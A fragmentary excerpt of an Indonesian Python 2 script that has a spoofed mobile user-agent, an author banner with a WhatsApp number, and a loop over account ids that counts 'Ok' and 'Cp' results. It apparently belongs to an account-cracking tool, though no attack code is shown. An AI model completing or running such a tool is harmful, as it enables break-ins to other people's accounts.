...
ua = ('Mozilla/5.0 (Linux; Android 8.1.0; L60 Pro Build/O21019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36')
logo = ("""\033[1;97m ______________________
                          •MVPム█▬█ █ ▀█▀•
•Author:Bino Prasetyo
•Wa:+6282155828439
...
def __menu__():
	...
	def main(arg):
		...
		print __warna_warni__+'\r[Sedang Operasi] %s/%s [Ok:%s] - [Cp:%s] ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		uid = arg
		try:
